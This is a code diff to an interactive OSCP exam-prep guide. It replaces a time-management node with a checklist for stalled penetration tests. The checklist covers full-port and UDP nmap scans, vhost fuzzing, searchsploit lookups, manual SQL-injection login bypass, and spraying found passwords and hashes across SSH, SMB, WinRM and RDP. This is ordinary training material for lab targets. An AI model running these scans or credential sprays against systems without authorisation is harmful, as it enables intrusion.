+# ── LAYER 1: ENUMERATION COMPLETENESS ────
+# Most stalls are premature exploitation attempts.
+# Honest answers only:
 
-# ── THE THREE QUESTIONS ──────────────────
-# 1. Have I fully enumerated, or did I start exploiting too early?
-#    gobuster/feroxbuster still running? Nmap UDP done?
-# 2. Am I trying the same thing repeatedly expecting different results?
-#    If yes — that vector is closed. Move.
-# 3. Is there another machine I can make progress on right now?
-#    Rotate. Come back in 45 minutes. Fresh eyes find what tired eyes miss.
+# Have you scanned ALL 65535 TCP ports?
+nmap -p- --min-rate 5000 $ip -oN allports.txt
+# (The intended path is often on a high port you missed)
 
-# ── THE POMODORO RESET ───────────────────
-# Set a timer: 25 minutes.
-# Pick ONE specific thing to test. Not enumerate more. One thing.
-# When the timer ends — stop. Assess. Decide.`,
-    warn: "The most common OSCP failure is not insufficient skill — it is 4 hours on one rabbit hole while other machines sit untouched. Rotation is not giving up. It is strategy.",
+# Have you done UDP?
+sudo nmap -sU --top-ports 100 $ip -oN udp.txt
+# SNMP (161), TFTP (69) — both expose credentials on OSCP boxes
+
+# Have you done vhost enumeration?
+# Many OSCP boxes hide the real app on a vhost, not the IP
+# If you found ANY domain name — fuzz vhosts now
+
+# Have you read robots.txt, sitemap.xml, /README, /changelog?
+curl -s http://$ip/robots.txt
+curl -s http://$ip/sitemap.xml
+
+# Have you checked every service version against searchsploit?
+searchsploit --nmap targeted.xml
+# Not just the obvious ones — ALL of them, including the boring ones
+
+# ── LAYER 2: READ WHAT YOU ALREADY HAVE ──
+# Before running more tools — re-read existing output:
+
+cat targeted.txt    # look at EVERY line, not just the ports you targeted
+# What does the hostname in smb-os-discovery say?
+# What banners did nmap grab on odd ports?
+# What do the NSE script outputs say? http-title? http-auth?
+
+# If there's a web app — re-read the page source:
+curl -s http://$ip | less
+# Look for: commented-out code, hidden form fields, version numbers,
+# internal hostnames in URLs, debug endpoints, JavaScript includes
+
+# If there's a login page:
+# Have you tried EVERY default credential combination?
+# Have you tried SQLi bypass manually (not just tools)?
+
+# ── LAYER 3: CREDENTIAL AUDIT ─────────────
+# Have you sprayed every credential found so far?
+# Found a hash → PtH every service
+# Found a password → spray every service (SSH, SMB, WinRM, RDP, FTP, web)
+# Found a username → default passwords, username-as-password
+
+# ── LAYER 4: VERSION CHASE ────────────────
+# Go back to every version number nmap returned
+# Cross-reference NVD, not just searchsploit:
+# https://nvd.nist.gov/vuln/search?query=<service>+<version>
+# Try one minor version up and one down — banners can be wrong
+
+# ── LAYER 5: THE HONEST QUESTION ─────────
+# Write this down:
+# "The evidence I have that my current attack vector is valid is: ___"
+# If you can not complete that sentence with concrete evidence —
+# you are in a rabbit hole. Exit now.
+
+# ── THE ROTATION DECISION ─────────────────
+# > 90 minutes with no forward movement = rotate to another machine
+# Mark this box: "PAUSED — [what you tried, what happened]"
+# Set it down completely. Minimum 45 minutes on another target.
+# This is not defeat. It is triage.`,
+    warn: "The checklist items in order of payoff: (1) missed ports / UDP — catches the box immediately if there is a high-port service you skipped; (2) vhost enumeration — the most-missed technique on OSCP boxes; (3) re-reading existing nmap output — the answer is often already there; (4) credential spray — one cred sprayed everywhere is worth hours of new enumeration. Work through these in order before concluding the surface is locked.",
     choices: [
+      { label: "Missed ports — going back to full scan", next: "full_portscan" },
+      { label: "Missed vhosts — fuzzing now", next: "vhost_enum" },
+      { label: "Missed credentials — spraying now", next: "cred_reuse" },
       { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
-      { label: "I need to triage my time", next: "mindset_triage" },
-      { label: "Back to recon — fresh start on this machine", next: "start" },
+      { label: "I need to triage my time and score", next: "mindset_triage" },
+      { label: "Fresh start — back to engagement start", next: "start" },
     ],
   },
 
@@ -7721,8 +8164,8 @@ export default function OSCPAdventure() {
   const topRef = useRef(null);
 
   const currentId = history[history.length - 1];
-  const node = nodes[currentId];
-  const phase = PHASES[node.phase] || PHASES.RECON;
+  const node = nodes[currentId] || nodes['start'];
+  const phase = PHASES[node?.phase] || PHASES.RECON;
 
   const go = (next) => {
     setHistory((h) => [...h, next]);
